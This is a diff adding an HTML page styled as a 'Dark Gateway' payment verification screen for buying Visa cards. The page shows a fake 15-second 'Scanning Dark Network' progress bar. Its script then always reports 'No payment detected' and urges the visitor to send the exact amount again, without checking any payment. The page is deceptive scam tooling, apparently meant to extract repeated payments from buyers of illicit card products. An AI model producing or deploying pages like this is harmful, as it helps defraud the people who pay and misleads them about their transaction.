@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 Payment Verification - Dark Gateway</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #000000 0%, #0a0a0a 50%, #000000 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #ffffff;
+            position: relative;
+            overflow: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 40%, rgba(255,0,0,0.1) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .verification-container {
+            background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
+            border-radius: 20px;
+            border: 2px solid #ff0000;
+            padding: 50px;
+            text-align: center;
+            box-shadow: 
+                0 25px 80px rgba(0,0,0,0.95),
+                0 0 30px rgba(255,0,0,0.3);
+            position: relative;
+            max-width: 500px;
+            width: 90%;
+        }
+
+        .verification-container::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff0000, #cc0000, #ff6600, #ff0000);
+            border-radius: 22px;
+            z-index: -1;
+            opacity: 0.3;
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            0% { opacity: 0.2; }
+            100% { opacity: 0.4; }
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255,0,0,0.3);
+            border-top: 4px solid #ff0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 30px;
+            box-shadow: 0 0 20px rgba(255,0,0,0.5);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .verification-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #ff0000;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255,0,0,0.5);
+        }
+
+        .verification-text {
+            font-size: 1.1rem;
+            color: #00ff00;
+            margin-bottom: 20px;
+            font-weight: 600;
+            text-shadow: 0 0 5px rgba(0,255,0,0.3);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(255,0,0,0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6600);
+            width: 0%;
+            animation: progress 15s linear forwards;
+            box-shadow: 0 0 10px rgba(255,0,0,0.5);
+        }
+
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        .status-text {
+            font-size: 0.9rem;
+            color: #888;
+            font-weight: 500;
+        }
+
+        .payment-message {
+            display: none;
+            background: rgba(255,0,0,0.1);
+            border: 2px solid #ff0000;
+            border-radius: 15px;
+            padding: 30px;
+            margin-top: 20px;
+        }
+
+        .payment-message h2 {
+            color: #ff0000;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255,0,0,0.5);
+        }
+
+        .payment-message p {
+            color: #ffff00;
+            font-size: 1.1rem;
+            line-height: 1.5;
+            font-weight: 600;
+            text-shadow: 0 0 5px rgba(255,255,0,0.3);
+        }
+
+        .close-button {
+            background: linear-gradient(45deg, #ff0000, #cc0000);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 700;
+            margin-top: 20px;
+            box-shadow: 0 5px 15px rgba(255,0,0,0.3);
+            transition: all 0.3s;
+        }
+
+        .close-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255,0,0,0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="verification-container">
+        <div id="loadingSection">
+            <div class="spinner"></div>
+            <h1 class="verification-title">🔍 Verifying Payment</h1>
+            <p class="verification-text">🕷️ Scanning Dark Network...</p>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+            <p class="status-text">⏳ Please wait while we verify your transaction...</p>
+        </div>
+
+        <div id="paymentMessage" class="payment-message">
+            <h2>⚠️ Payment Required</h2>
+            <p>🚫 No payment detected for this transaction.<br><br>
+            💰 Please complete your payment to receive your Visa card.<br><br>
+            🔄 Return to payment page and send the exact amount to the provided address.</p>
+            <button class="close-button" onclick="window.close()">🔙 Back to Payment</button>
+        </div>
+    </div>
+
+    <script>
+        // Show payment message after 15 seconds
+        setTimeout(() => {
+            document.getElementById('loadingSection').style.display = 'none';
+            document.getElementById('paymentMessage').style.display = 'block';
+        }, 15000);
+    </script>
+</body>
+</html>
